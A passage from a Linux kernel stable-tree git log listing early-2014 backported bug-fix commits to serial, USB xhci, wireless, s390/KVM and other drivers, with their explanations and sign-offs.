7.91% :6471 [guest.kernel.kallsyms] [g] scheduler\_tick
1.75% :6471 [guest.kernel.kallsyms] [g] native\_apic\_mem\_write
0.21% :6471 [guest.kernel.kallsyms] [g] apic\_timer\_interrupt
Signed-off-by: Dongsheng Yang
Acked-by: David Ahern
Cc: David Ahern
Link: http://lkml.kernel.org/r/1387564907-3045-1-git-send-email-yangds.fnst@cn.fujitsu.com
Signed-off-by: Arnaldo Carvalho de Melo
Signed-off-by: Greg Kroah-Hartman
commit 248f75a42a6ad1f3c29b05d1ce2487b3eba4fd9c
Author: Chen-Yu Tsai
Date: Thu Jan 16 14:34:23 2014 +0800
pinctrl: sunxi: Honor GPIO output initial vaules
commit fa8cf57c923e86a693a85aff1df579245a27cbb3 upstream.
Some GPIO users, such as fixed-regulator, request GPIO output with
initial value of 1. This was ignored by sunxi driver.
Signed-off-by: Chen-Yu Tsai
Acked-by: Maxime Ripard
Signed-off-by: Linus Walleij
Signed-off-by: Greg Kroah-Hartman
commit 2c457ffeb38442be473836d64d414cba2143a694
Author: Dasaratharaman Chandramouli
Date: Tue Dec 10 09:51:12 2013 -0800
misc: mic: bug fix for interrupt acknowledgement in MSI/INTx case.
commit df5e4e8b576108f88f79e5b4c984d51d460d2360 upstream.
The interrupt handler (mic\_interrupt), called in the MSI/INTx mode,
writes to the interrupt sources register to acknowledge the
interrupt and then calls the corresponding callback handlers to handle
the same. These callback handlers acknowledge the interrupts again
leading to missed interrupts. This patch fixes the issue by removing
the interrupt acknowlegment code from the callback handlers.
Reviewed-by: Sudeep Dutt
Reviewed-by: Nikhil Rao
Reviewed-by: Siva Krishna Kumar Reddy Yerramreddy
Signed-off-by: Dasaratharaman Chandramouli
Signed-off-by: Greg Kroah-Hartman
commit 96ce677076dbac9b1a7f44a91e204762e1355b57
Author: Stephen Warren
Date: Thu Jan 23 15:55:19 2014 -0800
rtc: max8907: weekday encoding fixes
commit 75ea799df4cb07e505c91b4abaa87bc28aad3e66 upstream.
The current MAX8907 driver has two issues related to weekday value
handling:
1)
The HW WEEKDAY register has range 0..6 rather than 1..7 as documented.
Note that I validated the actual HW range by observing the HW register
roll from 6->0 rather than 6->7->1 as would otherwise be expected.
This matches Linux's tm\_wday range of 0..6.
When the CMOS RAM content is lost, the date returned from the device is
2007-01-01 00:00:00, which is a Monday. The WEEKDAY register reads 1 in
this case. This matches the numbering in Linux's tm\_wday field.
Hence we should write Linux's tm\_wday value to the register without
modifying it. Hence, remove the +1/-1 calculations for WEEKDAY/tm\_wday.
2)
There's no need to make alarms match on the WEEKDAY register, since the
other fields together uniquely define the alarm date/time. Ignoring the
WEEKDAY value in the match isolates the driver from any incorrect value in
the current time copy of the WEEKDAY register.
Each change individually, or both together, solves an issue that I
observed; "hwclock -r" would time out waiting for its alarm to fire if the
CMOS RAM content had been lost, and hence the WEEKDAY register value
mismatched what the driver expected it to be. "hwclock -w" would solve
this by over-writing the HW default WEEKDAY register value with what the
driver expected.
Signed-off-by: Stephen Warren
Signed-off-by: Andrew Morton
Signed-off-by: Linus Torvalds
Signed-off-by: Greg Kroah-Hartman
commit 8174cd42809e060cc379eddff255c1ea53078073
Author: Sebastian Andrzej Siewior
Date: Wed Nov 27 17:43:43 2013 +0100
parport: parport\_pc: remove double PCI ID for NetMos
commit d6a484520c5572a4170fa915109ccfc0c38f5008 upstream.
In commit 85747f ("PATCH] parport: add NetMOS 9805 support") Max added
the PCI ID for NetMOS 9805 based on a Debian bug report from 2k4 which
was at the v2.4.26 time frame. The patch made into 2.6.14.
Shortly before that patch akpm merged commit 296d3c783b ("[PATCH] Support
NetMOS based PCI cards providing serial and parallel ports") which made
into v2.6.9-rc1.
Now we have two different entries for the same PCI id.
I have here the NetMos 9805 which claims to support SPP/EPP/ECP mode.
This patch takes Max's entry for titan\_1284p1 (base != -1 specifies the
ioport for ECP mode) and replaces akpm's entry for netmos\_9805 which
specified -1 (=none). Both share the same PCI-ID (my card has subsystem
0x1000 / 0x0020 so it should match PCI\_ANY).
While here I also drop the entry for titan\_1284p2 which is the same as
netmos\_9815.
Cc: Maximilian Attems
Signed-off-by: Sebastian Andrzej Siewior
Signed-off-by: Andrew Morton
Signed-off-by: Greg Kroah-Hartman
commit 1e7586f6dd7b7c9b8dba467bef9ef344fa54f2c7
Author: Heiko Carstens
Date: Tue Jan 21 17:31:10 2014 +0100
s390/uapi: fix struct statfs64 definition
commit 4e078146dff728f4865270a47710d57797e81eb6 upstream.
With b8668fd0a7e1b59f "s390/uapi: change struct statfs[64] member types
to unsigned values" the size of a couple of struct statfs64 member got
incorrectly changed from 64 to 32 bit for 32 bit builds.
Fix this by changing the type of couple of struct statfs64 members from
unsigned long to unsigned long long.
The definition of struct compat\_statfs64 was correct however.
Signed-off-by: Heiko Carstens
Signed-off-by: Martin Schwidefsky
Signed-off-by: Greg Kroah-Hartman
commit a94656765648f13577cb520761c957998506e409
Author: Dominik Dingel
Date: Mon Dec 9 18:30:01 2013 +0100
KVM: s390: ioeventfd: ignore leftmost bits
commit ff1f3cb4b3ac5d039f02679f34cb1498d110d241 upstream.
The diagnose 500 subcode 3 contains the 32 bit subchannel id in bits 32-63
(counting from the left). As for other I/O instructions, bits 0-31 should be
ignored and thus not be passed to kvm\_io\_bus\_write\_cookie().
This fixes a bug where the guest passed non-zero bits 0-31 which the
host tried to interpret, leading to ioeventfd notification failures.
Signed-off-by: Dominik Dingel
Reviewed-by: Cornelia Huck
Signed-off-by: Cornelia Huck
Signed-off-by: Greg Kroah-Hartman
commit aeb4c5fcb16509724e8975b7c902d2fc946d62cb
Author: Heiko Carstens
Date: Mon Nov 11 13:56:47 2013 +0100
KVM: s390: fix diagnose code extraction
commit 743db27c526e0f31cc507959d662e97e2048a86f upstream.
The diagnose code to be used is the contents of the base register (if not
zero), plus the displacement. The current code ignores the base register
contents. So let's fix that...
Reviewed-by: Cornelia Huck
Cc: stable@vger.kernel.org
Signed-off-by: Heiko Carstens
Signed-off-by: Cornelia Huck
Signed-off-by: Greg Kroah-Hartman
commit ed039ce3768ecaeac51bb24e297c8ef6e642693e
Author: Thomas Huth
Date: Wed Nov 6 15:46:33 2013 +0100
KVM: s390: Always store status during SIGP STOP\_AND\_STORE\_STATUS
commit e879892c725217a4af1012f31ae56be762473216 upstream.
The SIGP order STOP\_AND\_STORE\_STATUS is defined to stop a CPU and store
its status. However, we only stored the status if the CPU was still
running, so make sure that the status is now also stored if the CPU was
already stopped. This fixes the problem that the CPU information was
not stored correctly in kdump files, rendering them unreadable.
Signed-off-by: Thomas Huth
Acked-by: Christian Borntraeger
Signed-off-by: Cornelia Huck
Signed-off-by: Greg Kroah-Hartman
commit 4d93ec131e692450bf4507ee09dd65007ffaaa46
Author: Heiko Carstens
Date: Mon Jan 13 13:35:16 2014 +0100
s390/compat: fix PSW32\_USER\_BITS definition
commit 075dfd82102d2048e43e1cbf48d558d915c50072 upstream.
PSW32\_USER\_BITS should define the primary address space for user space
instead of the home address space.
Symptom of this bug is that gdb doesn't work in compat mode.
The bug was introduced with e258d719ff28 "s390/uaccess: always run the kernel
in home space" and f26946d7ecad "s390/compat: make psw32\_user\_bits a constant
value again".
Reported-by: Andreas Arnez
Signed-off-by: Heiko Carstens
Signed-off-by: Martin Schwidefsky
Signed-off-by: Greg Kroah-Hartman
commit 84d14624a9c952791af50adc8824c3698c568351
Author: Stephen Warren
Date: Tue Jan 7 15:00:12 2014 -0700
serial: 8250: enable UART\_BUG\_NOMSR for Tegra
commit 3685f19e07802ec4207b52465c408f185b66490e upstream.
Tegra chips have 4 or 5 identical UART modules embedded. UARTs C..E have
their MODEM-control signals tied off to a static state. However UARTs A
and B can optionally route those signals to/from package pins, depending
on the exact pinmux configuration.
When these signals are not routed to package pins, false interrupts may
trigger either temporarily, or permanently, all while not showing up in
the IIR; it will read as NO\_INT. This will eventually lead to the UART
IRQ being disabled due to unhandled interrupts. When this happens, the
kernel may print e.g.:
irq 68: nobody cared (try booting with the "irqpoll" option)
In order to prevent this, enable UART\_BUG\_NOMSR. This prevents
UART\_IER\_MSI from being enabled, which prevents the false interrupts
from triggering.
In practice, this is not needed under any of the following conditions:
\* On Tegra chips after Tegra30, since the HW bug has apparently been
fixed.
\* On UARTs C..E since their MODEM control signals are tied to the correct
static state which doesn't trigger the issue.
\* On UARTs A..B if the MODEM control signals are routed out to package
pins, since they will then carry valid signals.
However, we ignore these exceptions for now, since they are only relevant
if a board actually hooks up more than a 4-wire UART, and no currently
supported board does this. If we ever support a board that does, we can
refine the algorithm that enables UART\_BUG\_NOMSR to take those exceptions
into account, and/or read a flag from DT/... that indicates that the
board has hooked up and pinmux'd more than a 4-wire UART.
Reported-by: Olof Johansson  # autotester
Signed-off-by: Stephen Warren
Signed-off-by: Greg Kroah-Hartman
commit 6c640da03afedf50faab443f0768002a7e191ca3
Author: Jonathan Woithe
Date: Mon Dec 9 16:33:08 2013 +1030
serial: 8250: Fix initialisation of Quatech cards with the AMCC PCI chip
commit 9c5320f8d7d9a2cf623e65d50e1113f34d9b9eb1 upstream.
Fix the initialisation of older Quatech serial cards which are fitted with
the AMCC PCI Matchmaker interface chip.
Signed-off-by: Jonathan Woithe (jwoithe@just42.net)
Signed-off-by: Greg Kroah-Hartman
commit df2f06c9c5f9b1a9da3618444cf5f9bf0ea87cb9
Author: Yegor Yefremov
Date: Mon Dec 9 12:11:15 2013 +0100
serial: add support for 200 v3 series Titan card
commit 48c0247d7b7bf58abb85a39021099529df365c4d upstream.
Signed-off-by: Yegor Yefremov
Signed-off-by: Greg Kroah-Hartman
commit a51cc29a07dc2589fc4758492a19232c82913bc4
Author: Aaro Koskinen
Date: Fri Dec 20 16:19:47 2013 +0200
uio: fix devm\_request\_irq usage
commit 632fefaf1fff7c344191c363e08a43cf006fe60e upstream.
Commit e6789cd3dfb553077606ccafeb05e0043f072481 (uio: Simplify uio error
path by using devres functions) converted uio to use devm\_request\_irq().
This introduced a change in behaviour since the IRQ is associated with
the parent device instead of the created UIO device. The IRQ will remain
active after uio\_unregister\_device() is called, and some drivers will
crash because of this. The patch fixes this.
Signed-off-by: Aaro Koskinen
Signed-off-by: Greg Kroah-Hartman
commit 6c84d406c04505f220158ef50479d392a562d96c
Author: Sarah Sharp
Date: Mon Jan 6 13:07:03 2014 -0800
xhci: Set scatter-gather limit to avoid failed block writes.
commit f2d9b991c549f159dc9ae81f77d8206c790cbfee upstream.
Commit 35773dac5f862cb1c82ea151eba3e2f6de51ec3e "usb: xhci: Link TRB
must not occur within a USB payload burst" attempted to fix an issue
found with USB ethernet adapters, and inadvertently broke USB storage
devices. The patch attempts to ensure that transfers never span a
segment, and rejects transfers that have more than 63 entries (or
possibly less, if some entries cross 64KB boundaries).
usb-storage limits the maximum transfer size to 120K, and we had assumed
the block layer would pass a scatter-gather list of 4K entries,
resulting in no more than 31 sglist entries:
http://marc.info/?l=linux-usb&m=138498190419312&w=2
That assumption was wrong, since we've seen the driver reject a write
that was 218 sectors long (of probably 512 bytes each):
Jan 1 07:04:49 jidanni5 kernel: [ 559.624704] xhci\_hcd 0000:00:14.0: Too many fragments 79, max 63
...
Jan 1 07:04:58 jidanni5 kernel: [ 568.622583] Write(10): 2a 00 00 06 85 0e 00 00 da 00
Limit the number of scatter-gather entries to half a ring segment. That
should be margin enough in case some entries cross 64KB boundaries.
Increase the number of TRBs per segment from 64 to 256, which should
result in ring segments fitting on a 4K page.
Signed-off-by: Sarah Sharp
Reported-by: jidanni@jidanni.org
References: http://bugs.debian.org/733907
Fixes: 35773dac5f86 ('usb: xhci: Link TRB must not occur within a USB payload burst')
Signed-off-by: Greg Kroah-Hartman
commit e8ca4934157c039fd1da479c5a7ad2684b1f1ab6
Author: Ben Hutchings
Date: Mon Jan 6 03:16:32 2014 +0000
xhci: Avoid infinite loop when sg urb requires too many trbs
commit d6c9ea9069af684358efedcaf2f2f687f51c58ee upstream.
Currently prepare\_ring() returns -ENOMEM if the urb won't fit into a
single ring segment. usb\_sg\_wait() treats this error as a temporary
condition and will keep retrying until something else goes wrong.
The number of retries should be limited in usb\_sg\_wait(), but also
prepare\_ring() should not return an error code that suggests it might
be worth retrying. Change it to -EINVAL.
Reported-by: jidanni@jidanni.org
References: http://bugs.debian.org/733907
Fixes: 35773dac5f86 ('usb: xhci: Link TRB must not occur within a USB payload burst')
Signed-off-by: Ben Hutchings
Signed-off-by: Sarah Sharp
Signed-off-by: Greg Kroah-Hartman
commit 0ff5f6294b1e1640251dccc8dd494fa3cd84522f
Author: Phil Pokorny
Date: Tue Jan 14 10:46:46 2014 -0800
hwmon: (k10temp) Add support for Kaveri CPUs
commit d303b1b5fbb688282bbf72a534b9dfed7af9fe4f upstream.
Add new PCI ID to support new model "Kaveri" family.
Signed-off-by: Philip Pokorny
Signed-off-by: Guenter Roeck
Signed-off-by: Greg Kroah-Hartman
commit e1d0d8b70c05aa5ed96f860f0da69c02e3e31674
Author: Jean-Jacques Hiblot
Date: Thu Jan 9 16:01:54 2014 +0100
ARM: at91: smc: bug fix in sam9\_smc\_cs\_read()
commit 1588c51cf6d782e63a8719681d905ef0ac22ee62 upstream.
There was a copy/paste error when reading the nwe\_pulse value.
Signed-off-by: Jean-Jacques Hiblot
Acked-by: Boris BREZILLON
Signed-off-by: Nicolas Ferre
Signed-off-by: Kevin Hilman
Signed-off-by: Greg Kroah-Hartman
commit 6ac2e205d68a7b1e56c738f1910c5a40abc1e2f8
Author: Ludovic Desroches
Date: Fri Nov 22 14:49:52 2013 +0100
ARM: at91: at91sam9g45: set default mmc pinctrl-names
commit 0645b93f6c223b594c0dca348e2ae0a23bccf6e3 upstream.
pinctrl-names property was missing from mmc nodes.
Signed-off-by: Ludovic Desroches
Acked-by: Jean-Christophe PLAGNIOL-VILLARD
Signed-off-by: Nicolas Ferre
Signed-off-by: Greg Kroah-Hartman
commit 8150a7afa6200473c0f88cb0fae9ba22888f297d
Author: Marek Roszko
Date: Fri Jan 10 10:33:11 2014 +0100
tty/serial: at91: disable uart timer at start of shutdown
commit 8bc661bfc0c2d221e209f4205bdaaf574d50100c upstream.
The uart timer will schedule a tasklet when it fires. It is possible that it
can fire inside \_shutdown before it is killed in the dma and pdc cleanup
routines. This causes a tasklet that exists after the port is shutdown, so when
the kernel finally executes it, it panics as the tty port is NULL.
This is a somewhat rare condition but its possible if a program keeps on
opening/closing the port. It has been observed in particular with systemd
boot messages that were causing a kernel panic because of this behavior.
Moving the timer deletion to the beginning of the function stops a tasklet from
being scheduled unexpectedly.
Signed-off-by: Marek Roszko
[nicolas.ferre@atmel.com: modify commit message, call setup\_timer() in any case]
Signed-off-by: Nicolas Ferre
Signed-off-by: Greg Kroah-Hartman
Signed-off-by: Greg Kroah-Hartman
commit d7f2686ed1afc2aa3a5a37c493aa8be977554d0b
Author: Mark Deneen
Date: Tue Jan 7 11:45:09 2014 +0100
tty/serial: at91: reset rx\_ring when port is shutdown
commit bb7e73c598fb226c75f7625088a8f6a45a0fc892 upstream.
When using RX DMA, the driver won't pass any data to the uart layer
until the buffer is flipped. When the port is shutdown, the dma buffers
are unmapped, but the head and tail of the ring buffer are not reseted.
Since the serial console will keep the port open, this will only
present itself when the uart is not shared.
To reproduce the issue, with an unpatched driver, run a getty on /dev/ttyS0
with no serial console and exit. Getty will exit, and when the new one returns
you will be unable to log in. If you hold down a key long enough to fill the
DMA buffer and flip it, you can then log in.
Signed-off-by: Mark Deneen
Acked-by: Leilei Zhao
[nicolas.ferre@atmel.com: adapt to mainline kernel, handle !DMA case]
Signed-off-by: Nicolas Ferre
Signed-off-by: Greg Kroah-Hartman
commit be08a62a7708f420431a85e57e8044efdf081552
Author: Marek Roszko
Date: Tue Jan 7 11:45:07 2014 +0100
tty/serial: at91: fix race condition in atmel\_serial\_remove
commit f50c995f9ebf064cea1368bf361c4e29679415b4 upstream.
The \_remove callback could be called when a tasklet is scheduled. tasklet\_kill
was called inside the function in order to free up any scheduled tasklets.
However it was called after uart\_remove\_one\_port which destroys tty references
needed in the port for atmel\_tasklet\_func.
Simply putting the tasklet\_kill at the start of the function will prevent this
conflict.
Signed-off-by: Marek Roszko
Acked-by: Leilei Zhao
Signed-off-by: Nicolas Ferre
Signed-off-by: Greg Kroah-Hartman
commit e1f473a09b52b87f7d1797c6ee2d05e84aac9df5
Author: Marek Roszko
Date: Tue Jan 7 11:45:06 2014 +0100
tty/serial: at91: Handle shutdown more safely
commit 0cc7c6c7916b1b6f34350ff1473b80b9f7e459c0 upstream.
Interrupts were being cleaned up late in the shutdown handler, it is possible
that an interrupt can occur and schedule a tasklet that runs after the port is
cleaned up. There is a null dereference due to this race condition with the
following stacktrace:
[] (atmel\_tasklet\_func+0x514/0x814) from [] (tasklet\_action+0x70/0xa8)
[] (tasklet\_action+0x70/0xa8) from [] (\_\_do\_softirq+0x90/0x144)
[] (\_\_do\_softirq+0x90/0x144) from [] (irq\_exit+0x40/0x4c)
[] (irq\_exit+0x40/0x4c) from [] (handle\_IRQ+0x64/0x84)
[] (handle\_IRQ+0x64/0x84) from [] (\_\_irq\_svc+0x40/0x50)
[] (\_\_irq\_svc+0x40/0x50) from [] (atmel\_rx\_dma\_release+0x88/0xb8)
[] (atmel\_rx\_dma\_release+0x88/0xb8) from [] (atmel\_shutdown+0x104/0x160)
[] (atmel\_shutdown+0x104/0x160) from [] (uart\_port\_shutdown+0x2c/0x38)
Signed-off-by: Marek Roszko
Acked-by: Leilei Zhao
Signed-off-by: Nicolas Ferre
Signed-off-by: Greg Kroah-Hartman
commit b6ece84bf2f402cd07ab076fb6faef6ed0a2c1c5
Author: Tomas Winkler
Date: Wed Jan 8 20:19:22 2014 +0200
mei: use hbm idle state to prevent spurious resets
commit 66ae460b13c31a176b41550259683c841a62af3e upstream.
When reset is caused by hbm protocol mismatch or timeout
we might end up in an endless reset loop and hbm protocol
will never sync
Signed-off-by: Tomas Winkler
Signed-off-by: Alexander Usyskin
Signed-off-by: Greg Kroah-Hartman
commit cab808a881049229532d18bc4a2ebee936716a23
Author: Malcolm Priestley
Date: Wed Jan 1 19:19:28 2014 +0000
staging: vt6656: CARDqGetNextTBTT correct uLowNextTBTT
commit 9acec059c0cef0bf086c738f4c0b1f4447782a48 upstream.
value uLowNextTBTT yields wrong value.
ULL is needed with qwTSF
Signed-off-by: Malcolm Priestley
Signed-off-by: Greg Kroah-Hartman
commit 85d937c854d1665c0439ef3eae6d2c3ba10c3b50
Author: Malcolm Priestley
Date: Sun Dec 8 09:11:30 2013 +0000
staging: vt6656: [BUG] BBvUpdatePreEDThreshold Always set sensitivity on bScanning
commit 8f248dae133668bfb8e9379b4b3f0571c858b24a upstream.
byBBPreEDIndex value is initially 0, this means that from
cold BBvUpdatePreEDThreshold is never set.
This means that sensitivity may be in an ambiguous state,
failing to scan any wireless points or at least distant ones.
Signed-off-by: Malcolm Priestley
Signed-off-by: Greg Kroah-Hartman
commit ba27ce242a7028f5dba549ef95a9efa3d86361e0
Author: Larry Finger
Date: Tue Dec 24 11:22:54 2013 -0600
staging: r8712u: Set device type to wlan
commit 3a21f00a5002b14e4aab52aef59d33ed28468a13 upstream.
The latest version of NetworkManager does not recognize the device as wireless
without this change.
Signed-off-by: Larry Finger
Signed-off-by: Greg Kroah-Hartman
commit 45c5560ef7eb98edb53a71f5b8ce5c0dddb2ea38
Author: Amir Shehata
Date: Tue Dec 3 21:58:47 2013 +0800
staging/lustre/ptlrpc: Fix a crash when dereferencing NULL pointer
commit 3c92a0bf4d72737035a16c4fe357ccd439c9b7d2 upstream.
When a system runs out of memory and the function
ptlrpc\_register\_bulk() is called from ptl\_send\_rpc() the call to
LNetMEAttach() fails due to failure to allocate memory. This forces
the code into an error path, which most probably previously went
untested. The error path:
if (rc != 0) {
CERROR("%s: LNetMEAttach failed x"LPU64"/%d: rc = %dn",
desc->bd\_export->exp\_obd->obd\_name, xid,
posted\_md, rc);
break;
}
This print assumes that desc->bd\_export is not NULL. However, it is.
In fact it is expected to be NULL. desc->bd\_import is the correct
structure to access in this case.
Lustre-change: http://review.whamcloud.com/7121
Intel-bug-id: https://jira.hpdd.intel.com/browse/LU-3585
Signed-off-by: Amir Shehata
Reviewed-by: Liang Zhen
Reviewed-by: Doug Oucharek
Reviewed-by: Oleg Drokin
Signed-off-by: Peng Tao
Signed-off-by: Andreas Dilger
Signed-off-by: Greg Kroah-Hartman
Signed-off-by: Greg Kroah-Hartman
commit f4c8e868983e927b1bf93508c805f1f08a2afcc4
Author: Sujith Manoharan
Date: Thu Jan 9 08:51:15 2014 +0530
ath9k: Disable cross-band FCC
commit 1e2f9295f4c657500111514f92a3d3894d0e05b4 upstream.
Fast Channel Change across bands was enabled for
AR9462 recently, but this is causing baseband issues.
Disable it until this feature is tested well. Also,
remove the feature bit for AR9565 since it is
a single-band card and doesn't support this feature.
Reported-by: Oleksij Rempel
Signed-off-by: Sujith Manoharan
Signed-off-by: John W. Linville
Signed-off-by: Greg Kroah-Hartman
commit 84666036f8a6b46492db7dd04b733732a4f3a542
Author: Sujith Manoharan
Date: Thu Jan 9 08:51:14 2014 +0530
ath9k: Use correct channel for RX packets
commit ff9a93f2ebb88ac7aab9568de80b64b92078e96d upstream.
Accessing the current channel definition in mac80211
when processing RX packets is problematic because it
could have been updated when a scan is issued. Since a
channel change involves flushing the existing packets
in the RX queue before a chip-reset is done, they would
be processed using the wrong band/channel information.
To avoid this, use the current channel information
maintained in the driver.
Reported-by: Oleksij Rempel
Signed-off-by: Sujith Manoharan
Signed-off-by: John W. Linville
Signed-off-by: Greg Kroah-Hartman
commit ed8034b113a9d491499ab650be0487431b6e32cf
Author: ZHAO Gang
Date: Sat Jan 18 00:17:38 2014 +0800
b43: fix the wrong assignment of status.freq in b43\_rx()
commit 64e5acb09ca6b50c97299cff9ef51299470b29f2 upstream.
Use the right function to update frequency value.
If rx skb is probe response or beacon, the wrong frequency value can
cause problem that bss info can't be updated when it should be.
Fixes: 8318d78a44d4 ("cfg80211 API for channels/bitrates, mac80211 and driver conversion")
Signed-off-by: ZHAO Gang
Acked-by: Larry Finger
Signed-off-by: John W. Linville
Signed-off-by: Greg Kroah-Hartman
commit 94080dee38400618751ed156107ffac856ac22b9
Author: Larry Finger
Date: Sun Jan 12 15:11:39 2014 -0600
b43legacy: Fix unload oops if firmware is not available
commit 452028665312672c6ba9e16a19248ee00ead9400 upstream.
The asyncronous firmware load uses a completion struct to hold firmware
processing until the user-space routines are up and running. There is.
however, a problem in that the waiter is nevered canceled during teardown.
As a result, unloading the driver when firmware is not available causes an oops.
Signed-off-by: Larry Finger
Signed-off-by: John W. Linville
Signed-off-by: Greg Kroah-Hartman
commit 8365103d678e6be9952722b22dbe7c2b8331757c
Author: Larry Finger
Date: Sun Jan 12 15:11:38 2014 -0600
b43: Fix unload oops if firmware is not available
commit 0673effd41dba323d6a280ef37b5ef29f3f5a653 upstream.
The asyncronous firmware load uses a completion struct to hold firmware
processing until the user-space routines are up and running. There is.
however, a problem in that the waiter is nevered canceled during teardown.
As a result, unloading the driver when firmware is not available causes an oops.
To be able to access the completion structure at teardown, it had to be moved
into the b43\_wldev structure.
This patch also fixes a typo in a comment.
Signed-off-by: Larry Finger
Signed-off-by: John W. Linville
Signed-off-by: Greg Kroah-Hartman
commit dd6ccf171f67ef638f000f6e70bb83c62e6c62c7
Author: Larry Finger
Date: Sun Jan 12 15:11:37 2014 -0600
b43: Fix lockdep splat
commit 09164043f63c947a49797750a09ca1cd7c31108e upstream.
In https://bugzilla.kernel.org/show\_bug.cgi?id=67561, a locking dependency is reported
when b43 is used with hostapd, and rfkill is used to kill the radio output.
The lockdep splat (in part) is as follows:
======================================================
[ INFO: possible circular locking dependency detected ]
3.12.0 #1 Not tainted
-------------------------------------------------------
rfkill/10040 is trying to acquire lock:
(rtnl\_mutex){+.+.+.}, at: [] rtnl\_lock+0x12/0x20
but task is already holding lock:
(rfkill\_global\_mutex){+.+.+.}, at: [] rfkill\_fop\_write+0x6a/0x170 [rfkill]
--snip--
Chain exists of:
rtnl\_mutex --> misc\_mtx --> rfkill\_global\_mutex
The fix is to move the initialization of the hardware random number generator
outside the code range covered by the rtnl\_mutex.
Reported-by: yury
Tested-by: yury
Signed-off-by: Larry Finger
Signed-off-by: John W. Linville
Signed-off-by: Greg Kroah-Hartman
commit 4aca366c885d29df6ca9803c13fd92e2b4f42854
Author: Eliad Peller
Date: Sun Jan 5 12:41:12 2014 +0200
iwlwifi: mvm: fix missing cleanup in .start() error path
commit 91b0d1198417cf4fd9a7bd4138b6909f0b359099 upstream.
Cleanup of iwl\_mvm\_leds was missing in case of error,
resulting in the following warning:
WARNING: at lib/kobject.c:196 kobject\_add\_internal+0x1f4/0x210()
kobject\_add\_internal failed for phy0-led with -EEXIST, don't try to register things with the same name in the same directory.
which prevents further reloads of the driver.
Signed-off-by: Eliad Peller
Signed-off-by: Emmanuel Grumbach
Signed-off-by: Greg Kroah-Hartman
commit 79a7d9a826165fcdde29bac4bec2f3da41f0a18a
Author: Emmanuel Grumbach
Date: Tue Dec 24 14:15:41 2013 +0200
iwlwifi: pcie: enable oscillator for L1 exit
commit 2d93aee152b1758a94a18fe15d72153ba73b5679 upstream.
Enabling the oscillator consumes slightly more power (100uA)
but allows to make sure that we exit from L1 on time.
Not doing so might lead to a PCIe specification violation
since we might wake up from L1 at the wrong time.
This issue has been identified on 3160 and 7260 only.
On older NICs L1 off is not enabled, on newer NICs (7265),
the issue is fixed.
When the bug occurs the user sees that the NIC has
disappeared from the PCI bridge, any access to the device
returns 0xff.
This fixes:
https://bugzilla.kernel.org/show\_bug.cgi?id=64541
and has been extensively discussed here:
http://markmail.org/thread/mfmpzqt3r333n4bo
Fixes: 99cd47142399 ("iwlwifi: add 7000 series device configuration")
Reported-and-tested-by: wzyboy
Reviewed-by: Johannes Berg
Signed-off-by: Emmanuel Grumbach
Signed-off-by: Greg Kroah-Hartman
commit a50a46af7d18043166d194dda782cf7c4e8d455d
Author: Bing Zhao
Date: Tue Jan 14 19:16:34 2014 -0800
mwifiex: fix wrong 11ac bits setting in fw\_cap\_info
commit 1e202242ee1432d68a8bea4919b2ae0ef19d9e06 upstream.
bit 14 is actually reserved and bit 12 & 13 should be used for
11ac capability in fw\_cap\_info.
Signed-off-by: Bing Zhao
Signed-off-by: John W. Linville
Signed-off-by: Greg Kroah-Hartman
commit 9f0359a610c252bb9e8764e73e160020f8dfd308
Author: Amitkumar Karwar
Date: Fri Jan 10 14:30:41 2014 -0800
mwifiex: add missing endian conversion for fw\_tsf
commit 9795229752c31da0c5f8a7dc4c827665327b52f9 upstream.
It is u64 data received from firmware. Little endian to cpu
conversion is required here.
Signed-off-by: Amitkumar Karwar
Signed-off-by: Bing Zhao
Signed-off-by: John W. Linville
Signed-off-by: Greg Kroah-Hartman
commit e820ca9d93d6593771771bfc9cc9788d515a5c16
Author: Larry Finger
Date: Mon Nov 25 10:45:28 2013 -0600
rtlwifi: rtl8188ee: Fix typo in code
commit f699273d6a624266ebc9198774f06ee64a3847a1 upstream.
The static analyser "cppcheck" shows the following typo:
drivers/net/wireless/rtlwifi/rtl8188ee/dm.c:1081]: (style) Same expression on both sides of '!='.
Signed-off-by: Larry Finger
Reported-by: David Binderman
Cc: David Binderman
Signed-off-by: John W. Linville
Signed-off-by: Greg Kroah-Hartman
commit 9bc0e062fe03fda337d347f32d9a28504c945d7e
Author: Larry Finger
Date: Mon Nov 18 11:11:36 2013 -0600
rtlwifi: rtl8192c: Update dynamic gain calculations
commit 796e453436b183057e2d7d9b2bcff88d0bf53ba7 upstream.
The vendor driver contained a number of improvements in the gain settings
for the rtl8192c{e,u} devices. This patch implements them in the kernel
driver.
Signed-off-by: Larry Finger
Signed-off-by: John W. Linville
Signed-off-by: Greg Kroah-Hartman
commit c92e19d0c2dc7ef40de83ad20c6de7703bfd3202
Author: Larry Finger
Date: Mon Nov 18 11:11:35 2013 -0600
rtlwifi: Add missing code to PWDB statics routine
commit d82403a9f407217b6aed5260aa92a120e8e98310 upstream.
Signed-off-by: Larry Finger
Signed-off-by: John W. Linville
Signed-off-by: Greg Kroah-Hartman
commit 15ca6fca90008c4cf504cf946fb711c7498fcd55
Author: Larry Finger
Date: Mon Nov 18 11:11:34 2013 -0600
rtlwifi: rtl8192cu: Fix some code in RF handling
commit e9b0784bb9de3152e787ee779868c626b137fb3b upstream.
Signed-off-by: Larry Finger
Signed-off-by: John W. Linville
Signed-off-by: Greg Kroah-Hartman
commit e0b7169e124dcbfb65c9b3a491a725f307275026
Author: Larry Finger
Date: Mon Nov 18 11:11:33 2013 -0600
rtlwifi: rtl8192cu: Update the power index registers
commit 9806eacf5de27ab01d680c5d75c92a3a89734e4f upstream.
This patch uses the newly introduced power index register routines.
Signed-off-by: Larry Finger
Signed-off-by: John W. Linville
Signed-off-by: Greg Kroah-Hartman
commit f50e4e983a0b5354a79b37c1d8ff4ce036e19d3d
Author: Larry Finger
Date: Mon Nov 18 11:11:32 2013 -0600
rtlwifi: rtl8192c: Add routines to save/restore power index registers
commit 97204e93f01868eeba6ae5c4f3270f32905bb418 upstream.
Signed-off-by: Larry Finger
Signed-off-by: John W. Linville
Signed-off-by: Greg Kroah-Hartman
commit b54c97ea32054562110847191fea54588c19b39f
Author: Larry Finger
Date: Mon Nov 18 11:11:30 2013 -0600
rtlwifi: Increase the RX queue length for USB drivers
commit dc6405712268fe514d3dd89aa936c4397b0871b9 upstream.
The current number of RX buffers queued is 32, which is too small under
heavy load. That number is doubled.
Signed-off-by: Larry Finger
Signed-off-by: John W. Linville
Signed-off-by: Greg Kroah-Hartman
commit ceb6fd9f03db2c86f6f2914bcfc066c707545e98
Author: Larry Finger
Date: Mon Nov 18 11:11:29 2013 -0600
